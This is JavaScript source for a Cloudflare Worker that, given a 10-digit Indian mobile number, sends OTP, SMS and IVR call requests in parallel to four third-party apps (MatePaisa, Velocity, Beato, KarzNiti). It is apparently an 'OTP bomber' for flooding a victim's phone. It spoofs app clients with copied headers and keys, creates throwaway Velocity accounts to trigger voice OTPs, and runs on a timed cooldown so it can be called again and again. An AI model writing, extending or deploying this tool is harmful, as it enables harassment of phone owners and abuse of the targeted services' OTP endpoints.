// ========================
// Simple fetch wrapper (FlareGun removed)
// ========================
const fg = {
    fetch: (url, opts) => fetch(url, opts)
};

const COOLDOWN_SECONDS = 30;

// ========================
// Helper: random string
// ========================
function randomString(len = 8) {
    const chars = 'abcdefghijklmnopqrstuvwxyz0123456789';
    let out = '';
    const buf = new Uint8Array(len);
    crypto.getRandomValues(buf);
    for (let i = 0; i < len; i++) out += chars[buf[i] % chars.length];
    return out;
}

// ========================
// 1) MatePaisa
// ========================
async function sendMatePaisa(phone) {
    const clean = phone.replace(/\D/g, '');
    if (clean.length !== 10) throw new Error('10 digits required');

    return await fg.fetch('https://gaeood-refaces.desisplit.com/nhcxs/qkirtt/gmthhn/rjbwl', {
        method: 'POST',
        headers: {
            'user-agent': 'Dart/3.9 (dart:io)',
            'accept-encoding': 'gzip',
            'csvdklegslngcfietkzyw': 'fdafd5267582605c',
            'content-type': 'application/json',
            'oqvudsrubclnkbxqkqkf': '1',
            'xegotqrowslanqjbqnq': 'MatePaisa',
            'svmdfygmarquc': '941079135e3105516b8bae927b6c21b2',
            'charset': 'utf-8',
            'host': 'gaeood-refaces.desisplit.com',
            'qddvjvvmcpunrdqb': 'com.matepaisa.credit.loantransaction.loantracker',
            'sdvlwapniboft': '',
            'zhfhtdjokwefdamtpcn': 'f7b27fba-3bcc-48ad-9964-6e853374c735',
            'craloswbfujlvad': '1'
        },
        body: JSON.stringify({ bglRycyMysat: clean })
    });
}

// ========================
// 2) Velocity (2-step)
// ========================
async function sendVelocity(phone) {
    const clean = phone.replace(/\D/g, '');
    if (clean.length !== 10) throw new Error('10 digits required');

    const headers = {
        'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36',
        'Accept': 'application/json, text/plain, */*',
        'Accept-Encoding': 'gzip, deflate, br, zstd',
        'Content-Type': 'application/json',
        'sec-ch-ua-platform': '"Android"',
        'sec-ch-ua': '"Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"',
        'sec-ch-ua-mobile': '?1',
        'origin': 'https://dashboard.velocity.in',
        'sec-fetch-site': 'same-site',
        'sec-fetch-mode': 'cors',
        'sec-fetch-dest': 'empty',
        'referer': 'https://dashboard.velocity.in/',
        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8,hi;q=0.7,zh-CN;q=0.6,zh;q=0.5',
        'priority': 'u=1, i'
    };

    // Step A
    const createRes = await fg.fetch('https://thor.velocity.in/api/v1/users/', {
        method: 'POST',
        headers,
        body: JSON.stringify({
            email: `user${clean}${randomString(8)}@mail.com`,
            full_name: `User ${clean.slice(-4)}`,
            phone: `+91${clean}`,
            password: 'Velocity@123',
            utm_params: '{}',
            preferences: {},
            application_type: null
        })
    });

    const createText = await createRes.text();
    let createData;
    try { createData = JSON.parse(createText); } catch { createData = createText; }

    const otpUuid =
        createData?.otp_uuid ||
        createData?.uuid ||
        createData?.data?.otp_uuid ||
        createData?.data?.uuid ||
        null;

    // Step B
    let otpData = null;
    if (otpUuid) {
        const otpRes = await fg.fetch('https://thor.velocity.in/api/v1/users/resend_otp_call', {
            method: 'POST',
            headers,
            body: JSON.stringify({ otp_uuid: otpUuid })
        });
        const t = await otpRes.text();
        try { otpData = JSON.parse(t); } catch { otpData = t; }
    }

    return {
        createUser: { status: createRes.status, response: createData },
        otp_uuid: otpUuid,
        resendOtp: otpData ? { response: otpData } : { skipped: true, reason: 'no otp_uuid' }
    };
}

// ========================
// 3) Beato (IVR OTP)
// ========================
async function sendBeato(phone) {
    const clean = phone.replace(/\D/g, '');
    if (clean.length !== 10) throw new Error('10 digits required');

    return await fg.fetch('https://api.beatoapp.com/v7/onboarding/generateotp', {
        method: 'POST',
        headers: {
            'host': 'api.beatoapp.com',
            'os': 'Android',
            'appname': 'beato',
            'appversion': '4.00.226-380',
            'key': 'ac5eab8c-8914-49bc-931c-c360144205ec',
            'devicemodel': 'Redmi 6Xiaomi9',
            'content-type': 'application/json; charset=utf-8',
            'accept-encoding': 'gzip',
            'user-agent': 'okhttp/5.3.2'
        },
        body: JSON.stringify({
            email: '',
            isdcode: '+91',
            otptype: 'ivr',
            phone: clean,
            resend: true
        })
    });
}

// ========================
// 4) KarzNiti
// ========================
async function sendKarzNiti(phone) {
    const clean = phone.replace(/\D/g, '');
    if (clean.length !== 10) throw new Error('10 digits required');

    return await fg.fetch('https://karznitiinterface.karyojana.com/oecm/hcihdx', {
        method: 'POST',
        headers: {
            'qzkehgfpacxckrsvdqphd': '8021d71b2a927dd8',
            'user-agent': 'Dart/3.9 (dart:io)',
            'accept-encoding': 'gzip',
            'content-type': 'application/json',
            'bhmigcvcfeksevo': 'app.loancompare.emicalc.creditbetter',
            'qboyqvegdbmdtpy': 'KarzNiti',
            'fchnitebabnkpto': '143a189f7ca5cb727d1e013a51cb741a',
            'wvzdfrtjjsvekenhsn': '',
            'charset': 'utf-8',
            'host': 'karznitiinterface.karyojana.com',
            'yvtyjgfsjbe': '1',
            'pothyefcbktwecri': '9d0f5264-64a8-44f9-b5ca-bb3b0771c355',
            'fhvkzjrqejxyjima': '1'
        },
        body: JSON.stringify({ uqooSlxcCzze: clean })
    });
}

// ========================
// Safe wrapper
// ========================
async function safe(name, fn, phone) {
    try {
        const r = await fn(phone);

        if (r && r.createUser) {
            return { name, success: true, ...r };
        }

        const text = await r.text();
        let data;
        try { data = JSON.parse(text); } catch { data = text; }

        return { name, success: r.status === 200, status: r.status, response: data };
    } catch (e) {
        return { name, success: false, error: e.message };
    }
}

// ========================
// Cooldown helpers (KV)
// ========================
async function isOnCooldown(env, phone) {
    if (!env || !env.COOLDOWN_KV) return { cooldown: false };
    const key = `cd:${phone}`;
    const val = await env.COOLDOWN_KV.get(key);
    if (!val) return { cooldown: false };

    const expiresAt = parseInt(val, 10);
    const now = Date.now();
    if (now < expiresAt) {
        const remaining = Math.ceil((expiresAt - now) / 1000);
        return { cooldown: true, remaining };
    }
    return { cooldown: false };
}

async function setCooldown(env, phone) {
    if (!env || !env.COOLDOWN_KV) return;
    const key = `cd:${phone}`;
    const expiresAt = Date.now() + COOLDOWN_SECONDS * 1000;
    await env.COOLDOWN_KV.put(key, String(expiresAt), { expirationTtl: 60 });
}

// ========================
// Worker Entry
// ========================
export default {
    async fetch(request, env) {
        const url = new URL(request.url);
        const mobile = url.searchParams.get('mobile');

        if (!mobile) {
            return new Response(JSON.stringify({ error: 'Missing ?mobile' }), {
                status: 400, headers: { 'Content-Type': 'application/json' }
            });
        }

        const clean = mobile.replace(/\D/g, '');
        if (clean.length !== 10) {
            return new Response(JSON.stringify({ error: 'Mobile must be exactly 10 digits' }), {
                status: 400, headers: { 'Content-Type': 'application/json' }
            });
        }

        // ⏳ Cooldown check
        const cd = await isOnCooldown(env, clean);
        if (cd.cooldown) {
            return new Response(JSON.stringify({
                mobile: clean,
                cooldown: true,
                remaining: cd.remaining,
                message: `Please wait ${cd.remaining}s before retrying this number`
            }), {
                status: 429,
                headers: { 'Content-Type': 'application/json' }
            });
        }

        // 🔥 4 APIs parallel
        const results = await Promise.all([
            safe('matepaisa', sendMatePaisa, clean),
            safe('velocity', sendVelocity, clean),
            safe('beato', sendBeato, clean),
            safe('karzniti', sendKarzNiti, clean)
        ]);

        const successCount = results.filter(r => r.success).length;

        await setCooldown(env, clean);

        return new Response(JSON.stringify({
            mobile: clean,
            cooldown: true,
            cooldown_seconds: COOLDOWN_SECONDS,
            total: results.length,
            success: successCount,
            failed: results.length - successCount,
            results
        }, null, 2), {
            status: 200, headers: { 'Content-Type': 'application/json' }
        });
    }
};
